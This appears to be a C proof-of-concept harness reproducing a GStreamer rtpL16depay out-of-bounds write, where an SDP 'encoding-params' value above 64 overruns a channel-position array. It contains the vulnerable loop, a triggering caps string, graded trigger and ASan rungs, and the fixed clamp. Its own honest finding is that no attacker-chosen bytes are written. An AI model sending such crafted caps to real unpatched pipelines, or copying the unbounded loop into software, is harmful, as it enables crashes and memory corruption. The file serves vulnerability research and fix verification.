/*
 * Extracted harness for GStreamer rtpL16depay CVE-2026-111183 /
 * GHSA-62fg-53h6-6f68 (ZDI-CAN-31143).
 *
 * Source-bound transcription from the vulnerable parent commit
 *   0b70c356345335dacc0acdc45d07a8a33bdf5eab
 * and the fix commit
 *   80c184b4c5ee8ba28b2540ba58f40b8d44b61622
 * ("rtpL8depay, rtpL16depay, rtpL24depay: fix out of bounds write for high
 * channel count"):
 *
 *   gst-plugins-good/gst/rtp/gstrtpL16depay.c:181-189
 *       channels = gst_rtp_L16_depay_parse_int (structure,
 *           "encoding-params", channels);   // else "channels"
 *     -> attacker-controlled from SDP caps, no upper bound
 *   gstrtpL16depay.c:193-198
 *       info = &rtpL16depay->info; info->channels = channels;
 *   gstrtpL16depay.c:201-216
 *       order = gst_rtp_channels_get_by_order (channels, channel_order);
 *       if (order) memcpy (info->position, order->pos,
 *                    sizeof (GstAudioChannelPosition) * channels);
 *       else gst_rtp_channels_create_default (channels, info->position);
 *   gstrtpchannels.c:237-259
 *       get_by_order only matches orders of 1..8 channels, so for
 *       channels > 8 the else branch always runs.
 *       void gst_rtp_channels_create_default (gint channels,
 *           GstAudioChannelPosition * posn) {
 *         for (i = 0; i < channels; i++) posn[i] = NONE; }
 *   gstrtpchannels.c:302-312  (fixed)
 *       adds gsize n_posn parameter and channels = MIN (channels, n_posn);
 *
 * GstAudioInfo.position is GstAudioChannelPosition position[64] in the
 * embedding GstRtpL16Depay element, so a caps value above 64 walks off the
 * fixed array. The written value is GST_AUDIO_CHANNEL_POSITION_NONE, a
 * compile-time constant (0), NOT sender-chosen data -- that is why rung 4 is
 * graded honestly as NOT DEMONSTRATED below.
 *
 * No GLib, no GStreamer, no sockets, no network. All bytes are synthesized
 * locally. In non-ASan modes posn is carved from a large safe backing and the
 * bytes past position[64] are prefilled with a marker so the true OOB extent
 * can be counted. In the ASan build posn is an exact 64-element allocation so
 * the real write faults. Buffers are leaked at exit deliberately.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define N_POSN 64
#define NONE 0                 /* GST_AUDIO_CHANNEL_POSITION_NONE */
#define ELEM  4                /* enum GstAudioChannelPosition is int-sized */
#define SAFE_BACKING 65536
#define OOB_BYTES(n) (((long) ((n) > N_POSN ? (n) - N_POSN : 0)) * ELEM)

typedef int gint;
typedef int GstAudioChannelPosition;

static unsigned char *g_backing;

/* gstrtpchannels.c:301-310 at the vulnerable parent, verbatim except that
 * g_return_if_fail (channels > 0) is written as an explicit guard. */
static void
vuln_create_default (gint channels, GstAudioChannelPosition * posn)
{
  gint i;

  if (channels <= 0)
    return;
  for (i = 0; i < channels; i++)
    posn[i] = NONE;
}

/* The fixed version at 80c184b4: new n_posn parameter, MIN clamp. */
static void
fixed_create_default (gint channels, GstAudioChannelPosition * posn,
    size_t n_posn)
{
  gint i;

  if (channels <= 0)
    return;
  if ((size_t) channels > n_posn)
    channels = (gint) n_posn;
  for (i = 0; i < channels; i++)
    posn[i] = NONE;
}

/* gstrtpL16depay.c:124-138 gst_rtp_L16_depay_parse_int, reduced: an int caps
 * field, else a string field via atoi, else default. */
static gint
parse_int_field (const char *caps, const char *field, gint def)
{
  char key[64];
  const char *p;

  snprintf (key, sizeof (key), "%s=(int)", field);
  p = strstr (caps, key);
  if (p)
    return atoi (p + strlen (key));
  snprintf (key, sizeof (key), "%s=(string)", field);
  p = strstr (caps, key);
  if (p)
    return atoi (p + strlen (key));
  return def;
}

static GstAudioChannelPosition *
alloc_posn (int exact)
{
  size_t bytes = exact ? (size_t) N_POSN * ELEM : (size_t) SAFE_BACKING;
  g_backing = (unsigned char *) malloc (bytes);
  if (!g_backing)
    exit (2);
  memset (g_backing, 0xab, bytes);
  return (GstAudioChannelPosition *) g_backing;
}

static long
count_oob (gint channels)
{
  long n = 0;
  long start = (long) N_POSN * ELEM;
  long end = start + (long) OOB_BYTES (channels);
  long i;
  if (end > SAFE_BACKING)
    end = SAFE_BACKING;
  for (i = start; i < end; i++)
    if (g_backing[i] == NONE)
      n++;
  return n;
}

static void
stamp (long off, const char *s)
{
  size_t i;
  for (i = 0; s[i]; i++)
    g_backing[off + (long) i] = (unsigned char) s[i];
}

static int
matches (long off, const char *s)
{
  size_t i;
  for (i = 0; s[i]; i++)
    if (g_backing[off + (long) i] != (unsigned char) s[i])
      return 0;
  return 1;
}

int
main (int argc, char **argv)
{
  const char *mode = argc > 1 ? argv[1] : "rung1";
  int asan_exact = (argc > 2 && strcmp (argv[2], "exact") == 0);
  GstAudioChannelPosition *posn;
  gint channels;

  /* SDP caps as delivered to set_caps; encoding-params is the RTP field
   * gst_rtp_L16_depay_setcaps reads first, default 0. */
  const char *caps = "application/x-rtp,payload=(int)96,clock-rate=(int)44100,"
      "encoding-params=(string)1000";
  const char *caps200 = "application/x-rtp,payload=(int)96,clock-rate=(int)44100,"
      "encoding-params=(string)200";

  if (!strcmp (mode, "rung1")) {
    channels = parse_int_field (caps, "encoding-params", 0);
    if (channels == 0)
      channels = parse_int_field (caps, "channels", 1);
    posn = alloc_posn (asan_exact);
    vuln_create_default (channels, posn);
    printf ("rung1 channels=%d position_capacity=%d oob_writes=%ld "
        "first_oob=%ld last_oob=%ld\n",
        channels, N_POSN, OOB_BYTES (channels) / ELEM,
        (long) N_POSN * ELEM,
        (long) N_POSN * ELEM + OOB_BYTES (channels) - 1);
    printf ("rung1 counted_none_bytes=%ld\n", count_oob (channels));
    printf ("rung1 verdict=%s\n",
        OOB_BYTES (channels) > 0 ? "TRIGGER" : "NO_TRIGGER");
    return 0;
  }

  if (!strcmp (mode, "rung2")) {
    long off1 = (long) N_POSN * ELEM + 512;
    long off2 = (long) N_POSN * ELEM + 1536;
    /* channels=200 covers off1 but not off2; channels=1000 covers both. */
    posn = alloc_posn (0);
    stamp (off1, "abcd");
    stamp (off2, "cdab");
    printf ("rung2 before off1_abcd=%d off2_cdab=%d\n",
        matches (off1, "abcd"), matches (off2, "cdab"));
    channels = parse_int_field (caps200, "encoding-params", 0);
    vuln_create_default (channels, posn);
    printf ("rung2 channels200 off1_abcd=%d off2_cdab=%d "
        "oob_bytes=%ld\n", matches (off1, "abcd"), matches (off2, "cdab"),
        OOB_BYTES (channels));
    posn = alloc_posn (0);
    stamp (off1, "abcd");
    stamp (off2, "cdab");
    channels = parse_int_field (caps, "encoding-params", 0);
    vuln_create_default (channels, posn);
    printf ("rung2 channels1000 off1_abcd=%d off2_cdab=%d "
        "oob_bytes=%ld\n", matches (off1, "abcd"), matches (off2, "cdab"),
        OOB_BYTES (channels));
    printf ("rung2 verdict=%s\n",
        (!matches (off1, "abcd") && !matches (off2, "cdab")) ?
        "LENGTH_CONTROL_OBSERVED" : "FAIL");
    return 0;
  }

  if (!strcmp (mode, "rung3")) {
    /* ASan build runs this with an exact 64-element allocation; the write
     * itself is the proof. Print a marker before faulting. */
    channels = parse_int_field (caps, "encoding-params", 0);
    posn = alloc_posn (asan_exact ? 1 : 0);
    printf ("rung3 channels=%d exact_alloc=%d\n", channels, asan_exact);
    fflush (stdout);
    vuln_create_default (channels, posn);
    printf ("rung3 no_fault\n");
    return 0;
  }

  if (!strcmp (mode, "rung4")) {
    /* Honest negative: the sink writes only the constant NONE. A caller
     * cannot place chosen bytes; it can only choose the length/offset of a
     * zero-fill. Record that as evidence rather than claiming a pass. */
    long off = (long) N_POSN * ELEM + 768;
    posn = alloc_posn (0);
    stamp (off, "deadbeeftest");
    channels = parse_int_field (caps, "encoding-params", 0);
    vuln_create_default (channels, posn);
    printf ("rung4 chosen_before=deadbeeftest chosen_after=");
    {
      int i;
      for (i = 0; i < 12; i++)
        printf ("%02x", g_backing[off + i]);
      printf ("\n");
    }
    printf ("rung4 chosen_bytes_written=0 written_value_constant=NONE(%d)\n",
        NONE);
    printf ("rung4 verdict=NOT_DEMONSTRATED\n");
    return 0;
  }

  if (!strcmp (mode, "fixed")) {
    channels = parse_int_field (caps, "encoding-params", 0);
    posn = alloc_posn (0);
    fixed_create_default (channels, posn, N_POSN);
    printf ("fixed channels=%d oob_writes=%ld verdict=%s\n",
        channels, count_oob (channels),
        count_oob (channels) == 0 ? "PASS" : "FAIL");
    return count_oob (channels) == 0 ? 0 : 1;
  }

  fprintf (stderr, "unknown mode %s\n", mode);
  return 2;
}
